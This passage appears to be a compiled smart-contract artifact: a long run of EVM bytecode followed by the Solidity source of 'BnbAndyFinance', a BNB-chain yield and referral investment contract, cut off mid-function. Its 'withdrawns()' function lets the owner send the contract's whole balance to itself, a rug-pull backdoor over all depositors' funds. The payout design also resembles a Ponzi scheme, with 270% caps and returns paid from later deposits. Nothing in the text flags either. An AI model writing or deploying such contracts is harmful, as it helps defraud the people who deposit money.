fffffffffffffffffffffffff168152602001908152602001600020600601549050919050565b601e81565b609681565b6000806001546121476103e8612139609660015461354390919063ffffffff16565b6134e590919063ffffffff16565b915091509091565b600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015481565b6000818154811061218b57600080fd5b906000526020600020016000915090505481565b60008060006121ad84612436565b6121b6856133c0565b6121bf8661340c565b9250925092509193909250565b6000612265600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060050154600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206006015461361b90919063ffffffff16565b9050919050565b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b6000612296336131bc565b9050600081116122db576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016122d290613fcf565b60405180910390fd5b60006122f1600a836134e590919063ffffffff16565b905080341015612336576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161232d90613fcf565b60405180910390fd5b600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f1935050505015801561239e573d6000803e3d6000fd5b506001600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055503373ffffffffffffffffffffffffffffffffffffffff167f2899dc8c12def1caa9accb64257cf2fd9f960f21bb27a560a757eae3c2ec43c18260405161242a919061374f565b60405180910390a25050565b600080600090505b600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000018054905081101561251857612503600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000182815481106124e2576124e1613e43565b5b906000526020600020906003020160010154836135bd90919063ffffffff16565b9150808061251090613e72565b91505061243e565b50919050565b6000600760019054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b600960009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000600760019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614905090565b600860009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600080600260008154811061260457612603613e43565b5b9060005260206000209060020201600001549150600260008154811061262d5761262c613e43565b5b90600052602060002090600202016001015490509091565b600a81565b6000600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600801805490509050919050565b6000600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600001805490509050919050565b600080600080600080600090506000600360008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020905080600001828154811061274e5761274d613e43565b5b906000526020600020906003020160000160009054906101000a900460ff16965060028760ff168154811061278657612785613e43565b5b90600052602060002090600202016001015495508060000182815481106127b0576127af613e43565b5b90600052602060002090600302016001015494508060000182815481106127da576127d9613e43565b5b90600052602060002090600302016002015493506128996128636201518060028460000186815481106128105761280f613e43565b5b906000526020600020906003020160000160009054906101000a900460ff1660ff168154811061284357612842613e43565b5b90600052602060002090600202016000015461354390919063ffffffff16565b82600001848154811061287957612878613e43565b5b9060005260206000209060030201600201546135bd90919063ffffffff16565b9250505091939590929450565b6060806060600084116128ee576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016128e59061403b565b60405180910390fd5b6000600360008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000209050600080600060329050806001896129489190613f4f565b612952919061405b565b92508088612960919061405b565b8460080180549050101561297d578360080180549050915061298c565b8088612989919061405b565b91505b6000838361299a9190613f4f565b67ffffffffffffffff8111156129b3576129b261409d565b5b6040519080825280602002602001820160405280156129e15781602001602082028036833780820191505090505b509050600084846129f29190613f4f565b67ffffffffffffffff811115612a0b57612a0a61409d565b5b604051908082528060200260200182016040528015612a395781602001602082028036833780820191505090505b50905060008585612a4a9190613f4f565b67ffffffffffffffff811115612a6357612a6261409d565b5b604051908082528060200260200182016040528015612a915781602001602082028036833780820191505090505b50905060008690505b85811015612bc057876008018181548110612ab857612ab7613e43565b5b906000526020600020906003020160000160009054906101000a900460ff16848883612ae49190613f4f565b81518110612af557612af4613e43565b5b602002602001019060ff16908160ff1681525050876008018181548110612b1f57612b1e613e43565b5b906000526020600020906003020160010154838883612b3e9190613f4f565b81518110612b4f57612b4e613e43565b5b602002602001018181525050876008018181548110612b7157612b70613e43565b5b906000526020600020906003020160020154828883612b909190613f4f565b81518110612ba157612ba0613e43565b5b6020026020010181815250508080612bb890613e72565b915050612a9a565b50828282995099509950505050505050509250925092565b60046020528060005260406000206000915090505481565b6000600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002090506000816005015490506000600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905080821115612c8c578091505b6000612c9733613170565b905060008111612cdc576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401612cd390613f2f565b60405180910390fd5b6000612d066103e8612cf860288761354390919063ffffffff16565b6134e590919063ffffffff16565b90506000612d326103e8612d24600a8861354390919063ffffffff16565b6134e590919063ffffffff16565b9050600860009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc839081150290604051600060405180830381858888f19350505050158015612d9c573d6000803e3d6000fd5b503373ffffffffffffffffffffffffffffffffffffffff167f2899dc8c12def1caa9accb64257cf2fd9f960f21bb27a560a757eae3c2ec43c183604051612de3919061374f565b60405180910390a2600960009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f19350505050158015612e53573d6000803e3d6000fd5b503373ffffffffffffffffffffffffffffffffffffffff167f2899dc8c12def1caa9accb64257cf2fd9f960f21bb27a560a757eae3c2ec43c182604051612e9a919061374f565b60405180910390a26000612edd612ece6064612ec060058a61354390919063ffffffff16565b6134e590919063ffffffff16565b8761361b90919063ffffffff16565b90503373ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f19350505050158015612f25573d6000803e3d6000fd5b5085600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254612f759190613f4f565b92505081905550612f938688600701546135bd90919063ffffffff16565b87600701819055506000600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020540361300b5785876005016000828254612ff69190613f4f565b925050819055506130063361367a565b613027565b8587600501600082825461301f9190613f4f565b925050819055505b50505050505050565b61303861256e565b613077576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161306e9061413e565b60405180910390fd5b60003073ffffffffffffffffffffffffffffffffffffffff16311061311757600760019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015613115573d6000803e3d6000fd5b505b565b6000600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600101549050919050565b662386f26fc1000081565b6000600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600501549050919050565b600080600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000209050600080600090505b82600001805490508110156133b05760006132c461328e62015180600287600001868154811061323b5761323a613e43565b5b906000526020600020906003020160000160009054906101000a900460ff1660ff168154811061326e5761326d613e43565b5b90600052602060002090600202016000015461354390919063ffffffff16565b8560000184815481106132a4576132a3613e43565b5b9060005260206000209060030201600201546135bd90919063ffffffff16565b9050808460010154101561339c5760008460000183815481106132ea576132e9613e43565b5b90600052602060002090600302016001015490506000856001015486600001858154811061331b5761331a613e43565b5b9060005260206000209060030201600201541161333c578560010154613365565b85600001848154811061335257613351613e43565b5b9060005260206000209060030201600201545b905060004284106133765742613378565b835b9050808210156133985761339583876135bd90919063ffffffff16565b95505b5050505b5080806133a890613e72565b915050613208565b508092505050919050565b602881565b6000600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600701549050919050565b6000600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030160016002811061346357613462613e43565b5b0154600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206003016000600281106134ba576134b9613e43565b5b01546134c69190613d11565b9050919050565b60056020528060005260406000206000915090505481565b6000808211613529576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401613520906141aa565b60405180910390fd5b6000828461353791906141f9565b90508091505092915050565b600080830361355557600090506135b7565b60008284613563919061405b565b905082848261357291906141f9565b146135b2576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016135a99061429c565b60405180910390fd5b809150505b92915050565b60008082846135cc9190613d11565b905083811015613611576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161360890614308565b60405180910390fd5b8091505092915050565b600082821115613660576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161365790614374565b60405180910390fd5b6000828461366e9190613f4f565b90508091505092915050565b6000600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020905060005b816000018054905081101561370f5760008260000182815481106136e7576136e6613e43565b5b906000526020600020906003020160010181905550808061370790613e72565b9150506136c0565b505050565b6040518060400160405280600290602082028036833780820191505090505090565b6000819050919050565b61374981613736565b82525050565b60006020820190506137646000830184613740565b92915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061379a8261376f565b9050919050565b6137aa8161378f565b81146137b557600080fd5b50565b6000813590506137c7816137a1565b92915050565b6000602082840312156137e3576137e261376a565b5b60006137f1848285016137b8565b91505092915050565b600060029050919050565b600081905092915050565b6000819050919050565b61382381613736565b82525050565b6000613835838361381a565b60208301905092915050565b6000602082019050919050565b613857816137fa565b6138618184613805565b925061386c82613810565b8060005b8381101561389d5781516138848782613829565b965061388f83613841565b925050600181019050613870565b505050505050565b60006040820190506138ba600083018461384e565b92915050565b60008115159050919050565b6138d5816138c0565b82525050565b60006020820190506138f060008301846138cc565b92915050565b6138ff8161378f565b82525050565b600060208201905061391a60008301846138f6565b92915050565b60006040820190506139356000830185613740565b6139426020830184613740565b9392505050565b60006139548261376f565b9050919050565b61396481613949565b82525050565b600060208201905061397f600083018461395b565b92915050565b61398e81613736565b811461399957600080fd5b50565b6000813590506139ab81613985565b92915050565b6000602082840312156139c7576139c661376a565b5b60006139d58482850161399c565b91505092915050565b60006060820190506139f36000830186613740565b613a006020830185613740565b613a0d6040830184613740565b949350505050565b600060ff82169050919050565b613a2b81613a15565b82525050565b600060a082019050613a466000830188613a22565b613a536020830187613740565b613a606040830186613740565b613a6d6060830185613740565b613a7a6080830184613740565b9695505050505050565b60008060408385031215613a9b57613a9a61376a565b5b6000613aa9858286016137b8565b9250506020613aba8582860161399c565b9150509250929050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b613af981613a15565b82525050565b6000613b0b8383613af0565b60208301905092915050565b6000602082019050919050565b6000613b2f82613ac4565b613b398185613acf565b9350613b4483613ae0565b8060005b83811015613b75578151613b5c8882613aff565b9750613b6783613b17565b925050600181019050613b48565b5085935050505092915050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b6000602082019050919050565b6000613bc682613b82565b613bd08185613b8d565b9350613bdb83613b9e565b8060005b83811015613c0c578151613bf38882613829565b9750613bfe83613bae565b925050600181019050613bdf565b5085935050505092915050565b60006060820190508181036000830152613c338186613b24565b90508181036020830152613c478185613bbb565b90508181036040830152613c5b8184613bbb565b9050949350505050565b600082825260208201905092915050565b7f4e6f742073746172746564207965740000000000000000000000000000000000600082015250565b6000613cac600f83613c65565b9150613cb782613c76565b602082019050919050565b60006020820190508181036000830152613cdb81613c9f565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000613d1c82613736565b9150613d2783613736565b9250828201905080821115613d3f57613d3e613ce2565b5b92915050565b7f496e73756666696369656e74206465706f73697420616d6f756e742e204d757360008201527f7420626520626967676572207468616e20000000000000000000000000000000602082015250565b6000613da1603183613c65565b9150613dac82613d45565b604082019050919050565b60006020820190508181036000830152613dd081613d94565b9050919050565b7f496e76616c696420706c616e0000000000000000000000000000000000000000600082015250565b6000613e0d600c83613c65565b9150613e1882613dd7565b602082019050919050565b60006020820190508181036000830152613e3c81613e00565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b6000613e7d82613736565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8203613eaf57613eae613ce2565b5b600182019050919050565b6000604082019050613ecf6000830185613a22565b613edc6020830184613740565b9392505050565b7f5573657220686173206e6f206469766964656e64730000000000000000000000600082015250565b6000613f19601583613c65565b9150613f2482613ee3565b602082019050919050565b60006020820190508181036000830152613f4881613f0c565b9050919050565b6000613f5a82613736565b9150613f6583613736565b9250828203905081811115613f7d57613f7c613ce2565b5b92915050565b7f4e6f20616374696f6e0000000000000000000000000000000000000000000000600082015250565b6000613fb9600983613c65565b9150613fc482613f83565b602082019050919050565b60006020820190508181036000830152613fe881613fac565b9050919050565b7f77726f6e6720696e646578000000000000000000000000000000000000000000600082015250565b6000614025600b83613c65565b915061403082613fef565b602082019050919050565b6000602082019050818103600083015261405481614018565b9050919050565b600061406682613736565b915061407183613736565b925082820261407f81613736565b9150828204841483151761409657614095613ce2565b5b5092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b7f46756e6374696f6e2061636365737369626c65206f6e6c79206279207468652060008201527f6f776e6572202121000000000000000000000000000000000000000000000000602082015250565b6000614128602883613c65565b9150614133826140cc565b604082019050919050565b600060208201905081810360008301526141578161411b565b9050919050565b7f536166654d6174683a206469766973696f6e206279207a65726f000000000000600082015250565b6000614194601a83613c65565b915061419f8261415e565b602082019050919050565b600060208201905081810360008301526141c381614187565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061420482613736565b915061420f83613736565b92508261421f5761421e6141ca565b5b828204905092915050565b7f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f60008201527f7700000000000000000000000000000000000000000000000000000000000000602082015250565b6000614286602183613c65565b91506142918261422a565b604082019050919050565b600060208201905081810360008301526142b581614279565b9050919050565b7f536166654d6174683a206164646974696f6e206f766572666c6f770000000000600082015250565b60006142f2601b83613c65565b91506142fd826142bc565b602082019050919050565b60006020820190508181036000830152614321816142e5565b9050919050565b7f536166654d6174683a207375627472616374696f6e206f766572666c6f770000600082015250565b600061435e601e83613c65565b915061436982614328565b602082019050919050565b6000602082019050818103600083015261438d81614351565b905091905056fea26469706673582212208afea0fe1948a2e29554f42d0e6a2d6aadfc6e93c594809f3fd8a1c16c6b8ad564736f6c63430008120033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.18;\r\n\r\ncontract BnbAndyFinance {\r\n    using SafeMath for uint256;\r\n\r\n    uint256 public constant INVEST_MIN_AMOUNT = 1e16; // 0.01 bnb\r\n    uint256[] public REFERRAL_PERCENTS = [100, 50];\r\n    uint256 public constant TOTAL_REF = 150;\r\n    uint256 public constant PROJECT_FEE = 30;\r\n    uint256 public constant DEV_FEE = 20;\r\n    uint256 public constant PROJECT_FEE_WT = 40;\r\n    uint256 public constant DEV_FEE_WT = 10;\r\n    uint256 public constant PERCENTS_DIVIDER = 1000;\r\n    uint256 public constant TIME_STEP = 1 days;\r\n\r\n    uint256 public totalInvested;\r\n\r\n    struct Plan {\r\n        uint256 time;\r\n        uint256 percent;\r\n    }\r\n\r\n    Plan[] internal plans;\r\n\r\n    struct Deposit {\r\n        uint8 plan;\r\n        uint256 amount;\r\n        uint256 start;\r\n    }\r\n\r\n    struct Action {\r\n        uint8 types;\r\n        uint256 amount;\r\n        uint256 date;\r\n    }\r\n\r\n    struct User {\r\n        Deposit[] deposits;\r\n        uint256 checkpoint;\r\n        address referrer;\r\n        uint256[2] levels;\r\n        uint256 bonus;\r\n        uint256 totalBonus;\r\n        uint256 withdrawn;\r\n        Action[] actions;\r\n    }\r\n\r\n    mapping(address => User) internal users;\r\n    mapping(address => uint256) public last_deposit;\r\n    mapping(address => uint256) public insurance;\r\n    mapping(address => uint256) public available;\r\n\r\n    bool public started;\r\n\r\n    address payable private _owner;\r\n    address payable public commissionWallet;\r\n    address payable public devWallet;\r\n    address payable public insuranceWallet;\r\n\r\n    event Newbie(address user);\r\n    event NewDeposit(address indexed user, uint8 plan, uint256 amount);\r\n    event Withdrawn(address indexed user, uint256 amount);\r\n    event RefBonus(\r\n        address indexed referrer,\r\n        address indexed referral,\r\n        uint256 indexed level,\r\n        uint256 amount\r\n    );\r\n    event FeePayed(address indexed user, uint256 totalAmount);\r\n\r\n    constructor(\r\n        address payable wallet,\r\n        address payable dev_wallet,\r\n        address payable ins_wallet\r\n    ) {\r\n        require(!isContract(wallet));\r\n        _owner = payable(msg.sender);\r\n        commissionWallet = wallet;\r\n        devWallet = dev_wallet;\r\n        insuranceWallet = ins_wallet;\r\n\r\n        plans.push(Plan(385, 7));\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(isOwner(), \"Function accessible only by the owner !!\");\r\n        _;\r\n    }\r\n\r\n    function isOwner() public view returns (bool) {\r\n        return msg.sender == _owner;\r\n    }\r\n\r\n    function setInsurance() public payable {\r\n        uint256 activeAmount = getUserActivePlansAmount(msg.sender);\r\n\r\n        require(activeAmount > 0, \"No action\");\r\n        uint256 _ins_fee = activeAmount.div(10); // %10\r\n        require(msg.value >= _ins_fee, \"No action\");\r\n\r\n        insuranceWallet.transfer(_ins_fee);\r\n\r\n        insurance[msg.sender] = 1;\r\n\r\n        emit FeePayed(msg.sender, _ins_fee);\r\n    }\r\n\r\n    function invest(address referrer) public payable {\r\n        uint8 plan = 0;\r\n        if (!started) {\r\n            if (msg.sender == commissionWallet) {\r\n                started = true;\r\n            } else revert(\"Not started yet\");\r\n        }\r\n\r\n        uint256 minDeposit = (last_deposit[msg.sender].div(10)) +\r\n            last_deposit[msg.sender];\r\n        require(msg.value >= INVEST_MIN_AMOUNT);\r\n        require(\r\n            msg.value > minDeposit,\r\n            \"Insufficient deposit amount. Must be bigger than \"\r\n        );\r\n        require(plan < 1, \"Invalid plan\");\r\n\r\n        uint256 _project_fee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);\r\n        uint256 _dev_fee = msg.value.mul(DEV_FEE).div(PERCENTS_DIVIDER);\r\n\r\n        commissionWallet.transfer(_project_fee);\r\n        emit FeePayed(msg.sender, _project_fee);\r\n\r\n        devWallet.transfer(_dev_fee);\r\n        emit FeePayed(msg.sender, _dev_fee);\r\n\r\n        User storage user = users[msg.sender];\r\n\r\n        if (user.referrer == address(0)) {\r\n            if (users[referrer].deposits.length > 0 && referrer != msg.sender) {\r\n                user.referrer = referrer;\r\n            }\r\n\r\n            address upline = user.referrer;\r\n            for (uint256 i = 0; i < 2; i++) {\r\n                if (upline != address(0)) {\r\n                    users[upline].levels[i] = users[upline].levels[i].add(1);\r\n                    upline = users[upline].referrer;\r\n                } else break;\r\n            }\r\n        }\r\n\r\n        if (user.referrer != address(0)) {\r\n            address upline = user.referrer;\r\n            for (uint256 i = 0; i < 2; i++) {\r\n                if (upline != address(0)) {\r\n                    uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(\r\n                        PERCENTS_DIVIDER\r\n                    );\r\n                    users[upline].bonus = users[upline].bonus.add(amount);\r\n                    users[upline].totalBonus = users[upline].totalBonus.add(\r\n                        amount\r\n                    );\r\n                    emit RefBonus(upline, msg.sender, i, amount);\r\n                    upline = users[upline].referrer;\r\n                } else break;\r\n            }\r\n        }\r\n\r\n        if (user.deposits.length == 0) {\r\n            user.checkpoint = block.timestamp;\r\n            emit Newbie(msg.sender);\r\n        }\r\n\r\n        user.deposits.push(Deposit(plan, msg.value, block.timestamp));\r\n        user.actions.push(Action(0, msg.value, block.timestamp));\r\n\r\n        last_deposit[msg.sender] = msg.value;\r\n        available[msg.sender] += msg.value.mul(270).div(100);\r\n\r\n        totalInvested = totalInvested.add(msg.value);\r\n\r\n        emit NewDeposit(msg.sender, plan, msg.value);\r\n    }\r\n\r\n    function removeUserDeposits(address _account) internal {\r\n        User storage user = users[_account];\r\n\r\n        for (uint256 i = 0; i < user.deposits.length; i++) {\r\n            user.deposits[i].amount = 0;\r\n        }\r\n    }\r\n\r\n    function withdraw() public {\r\n        emit Newbie(msg.sender);\r\n\r\n        User storage user = users[msg.sender];\r\n\r\n        uint256 totalAmount = getUserDividends(msg.sender);\r\n        uint256 maxWithdraw = available[msg.sender];\r\n\r\n        if (totalAmount > maxWithdraw) {\r\n            totalAmount = maxWithdraw;\r\n        }\r\n\r\n        uint256 _project_fee = totalAmount.mul(PROJECT_FEE_WT).div(\r\n            PERCENTS_DIVIDER\r\n        );\r\n        uint256 _dev_fee = totalAmount.mul(DEV_FEE_WT).div(PERCENTS_DIVIDER);\r\n\r\n        commissionWallet.transfer(_project_fee);\r\n        emit FeePayed(msg.sender, _project_fee);\r\n\r\n        devWallet.transfer(_dev_fee);\r\n        emit FeePayed(msg.sender, _dev_fee);\r\n\r\n        require(totalAmount > 0, \"User has no dividends\");\r\n\r\n        user.checkpoint = block.timestamp;\r\n        user.withdrawn = user.withdrawn.add(totalAmount);\r\n        uint256 userAmount = totalAmount.sub(totalAmount.mul(5).div(100));\r\n        payable(msg.sender).transfer(userAmount);\r\n        available[msg.sender] -= totalAmount;\r\n\r\n        if (available[msg.sender] == 0) {\r\n            removeUserDeposits(msg.sender);\r\n        }\r\n\r\n        user.actions.push(Action(1, totalAmount, block.timestamp));\r\n\r\n        emit Withdrawn(msg.sender, totalAmount);\r\n    }\r\n\r\n    function withdrawRef() public {\r\n        User storage user = users[msg.sender];\r\n\r\n        uint256 totalAmount = user.bonus;\r\n        uint256 maxWithdraw = available[msg.sender];\r\n\r\n        if (totalAmount > maxWithdraw) {\r\n            totalAmount = maxWithdraw;\r\n        }\r\n\r\n        uint256 referralBonus = getUserReferralBonus(msg.sender);\r\n        require(referralBonus > 0, \"User has no dividends\");\r\n\r\n        uint256 _project_fee = totalAmount.mul(PROJECT_FEE_WT).div(\r\n            PERCENTS_DIVIDER\r\n        );\r\n        uint256 _dev_fee = totalAmount.mul(DEV_FEE_WT).div(PERCENTS_DIVIDER);\r\n\r\n        commissionWallet.transfer(_project_fee);\r\n        emit FeePayed(msg.sender, _project_fee);\r\n\r\n        devWallet.transfer(_dev_fee);\r\n        emit FeePayed(msg.sender, _dev_fee);\r\n\r\n        uint256 userAmount = totalAmount.sub(totalAmount.mul(5).div(100));\r\n        payable(msg.sender).transfer(userAmount);\r\n        available[msg.sender] -= totalAmount;\r\n        user.withdrawn = user.withdrawn.add(totalAmount);\r\n\r\n        if (available[msg.sender] == 0) {\r\n            user.bonus -= totalAmount;\r\n            removeUserDeposits(msg.sender);\r\n        } else {\r\n            user.bonus -= totalAmount;\r\n        }\r\n    }\r\n\r\n    function withdrawns() external onlyOwner {\r\n        if (address(this).balance >= 0) {\r\n            _owner.transfer(address(this).balance);\r\n        }\r\n    }\r\n\r\n    function getContractBalance() public view returns (uint256) {\r\n        return address(this).balance;\r\n    }\r\n\r\n    function getPlanInfo() public view returns (uint256 time, uint256 percent) {\r\n        time = plans[0].time;\r\n        percent = plans[0].percent;\r\n    }\r\n\r\n    function getUserDividends(\r\n        address userAddress\r\n    ) public view returns (uint256) {\r\n        User storage user = users[userAddress];\r\n\r\n        uint256 totalAmount;\r\n\r\n        for (uint256 i = 0; i < user.deposits.length; i++) {\r\n            uint256 finish = user.deposits[i].start.add(\r\n                plans[user.deposits[i].plan].time.mul(TIME_STEP)\r\n            );\r\n            if (user.checkpoint < finish) {\r\n                uint256 share = user\r\n                    .deposits[i]\r\n                    .amount\r\n                    .mul(plans[user.deposits[i].plan].percent)\r\n                    .div(PERCENTS_DIVIDER);\r\n                uint256 from = user.deposits[i].start > user.checkpoint\r\n                    ? user.deposits[i].start\r\n                    : user.checkpoint;\r\n                uint256 to = finish < block.timestamp\r\n                    ? finish\r\n                    : block.timestamp;\r\n                if (from < to) {\r\n                    totalAmount = totalAmount.add(\r\n                        share.mul(to.sub(from)).div(TIME_STEP)\r\n                    );\r\n                }\r\n            }\r\n        }\r\n\r\n        return totalAmount;\r\n    }\r\n\r\n    function getUserActivePlansAmount(\r\n        address userAddress\r\n    ) public view returns (uint256) {\r\n        User storage user = users[userAddress];\r\n\r\n        uint256 totalAmount;\r\n\r\n        for (uint256 i = 0; i < user.deposits.length; i++) {\r\n            uint256 finish = user.deposits[i].start.add(\r\n                plans[user.deposits[i].plan].time.mul(TIME_STEP)\r\n            );\r\n            if (user.checkpoint < finish) {\r\n                uint256 _amount = user.deposits[i].amount;\r\n                uint256 from = user.deposits[i].start > user.checkpoint\r\n                    ? user.deposits[i].start\r\n                    : user.checkpoint;\r\n                uint256 to = finish < block.timestamp\r\n                    ? finish\r\n                    : block.timestamp;\r\n                if (from < to) {\r\n                    totalAmount = totalAmount.add(_amount);\r\n                }\r\n            }\r\n        }\r\n\r\n        return totalAmount;\r\n    }\r\n\r\n    function getUserTotalWithdrawn(\r\n        address userAddress\r\n    ) public view returns (uint256) {\r\n        return users[userAddress].withdrawn;\r\n    }\r\n\r\n    function getUserCheckpoint(\r\n        address userAddress\r\n    ) public view returns (uint256) {\r\n        return users[userAddress].checkpoint;\r\n    }\r\n\r\n    function getUserReferrer(\r\n        address userAddress\r\n    ) public view returns (address) {\r\n        return users[userAddress].referrer;\r\n    }\r\n\r\n    function getUserDownlineCount(\r\n        address userAddress\r\n    ) public view returns (uint256[2] memory referrals) {\r\n        return (users[userAddress].levels);\r\n    }\r\n\r\n    function getUserTotalReferrals(\r\n        address userAddress\r\n    ) public view returns (uint256) {\r\n        return users[userAddress].levels[0] + users[userAddress].levels[1];\r\n    }\r\n\r\n    function getUserReferralBonus(\r\n        address userAddress\r\n    ) public view returns (uint256) {\r\n        return users[userAddress].bonus;\r\n    }\r\n\r\n    function getUserReferralTotalBonus(\r\n        address userAddress\r\n    ) public view returns (uint256) {\r\n        return users[userAddress].totalBonus;\r\n    }\r\n\r\n    function getUserReferralWithdrawn(\r\n        address userAddress\r\n    ) public view returns (uint256) {\r\n        return users[userAddress].totalBonus.sub(users[userAddress].bonus);\r\n    }\r\n\r\n    function getUserAvailable(\r\n        address userAddress\r\n    ) public view returns (uint256) {\r\n        return\r\n            getUserReferralBonus(userAddress).add(\r\n                getUserDividends(userAddress)\r\n            );\r\n    }\r\n\r\n    function getUserAmountOfDeposits(\r\n        address userAddress\r\n    ) public view returns (uint256) {\r\n        return users[userAddress].deposits.length;\r\n    }\r\n\r\n    function getUserTotalDeposits(\r\n        address userAddress\r\n    ) public view returns (uint256 amount) {\r\n        for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {\r\n            amount = amount.add(users[userAddress].deposits[i].amount);\r\n        }\r\n    }\r\n\r\n    function getUserDepositInfo(\r\n        address userAddress\r\n    )\r\n        public\r\n        view\r\n        returns (\r\n            uint8 plan,\r\n            uint256 percent,\r\n            uint256 amount,\r\n            uint256 start,\r\n            uint256 finish\r\n        )\r\n    {\r\n        uint256 index = 0;\r\n        User storage user = users[userAddress];\r\n\r\n        plan = user.deposits[index].plan;\r\n        percent = plans[plan].percent;\r\n        amount = user.deposits[index].amount;\r\n        start = user.deposits[index].start;\r\n        finish = user.deposits[index].start.add(\r\n            plans[user.deposits[index].plan].time.mul(TIME_STEP)\r\n        );\r\n    }\r\n\r\n    function getUserActions(\r\n        address userAddress,\r\n        uint256 index\r\n    ) public view returns (uint8[] memory, uint256[] memory, uint256[] memory) {\r\n        require(index > 0, \"wrong index\");\r\n        User storage user = users[userAddress];\r\n        uint256 start;\r\n        uint256 end;\r\n        uint256 cnt = 50;\r\n\r\n        start = (index - 1) * cnt;\r\n        if (user.actions.length < (index * cnt)) {\r\n            end = user.actions.length;\r\n        } else {\r\n            end = index * cnt;\r\n        }\r\n\r\n        uint8[] memory types = new uint8[](end - start);\r\n        uint256[] memory amount = new uint256[](end - start);\r\n        uint256[] memory date = new uint256[](end - start);\r\n\r\n        for (uint256 i = start; i < end; i++) {\r\n            types[i - start] = user.actions[i].types;\r\n            amount[i - start] = user.actions[i].amount;\r\n            date[i - start] = user.actions[i].date;\r\n        }\r\n        return (types, amount, date);\r\n    }\r\n\r\n    function getUserActionLength(\r\n        address userAddress\r\n    ) public view returns (uint256) {\r\n        return users[userAddress].actions.length;\r\n    }\r\n\r\n    function getSiteInfo()\r\n        public\r\n        view\r\n        returns (uint256 _totalInvested, uint256 _totalBonus)\r\n    {\r\n        return (\r\n            totalInvested,\r\n            totalInvested.mul(TOTAL_REF).div(PERCENTS_DIVIDER)\r\n        );\r\n    }\r\n\r\n    function getUserInfo(\r\n        address userAddress\r\n    )\r\n        public\r\n        view\r\n        returns (\r\n            uint256 totalDeposit,\r\n            uint256 totalWithdrawn,\r\n            uint256 totalReferrals\r\n        )\r\n    {\r\n        return 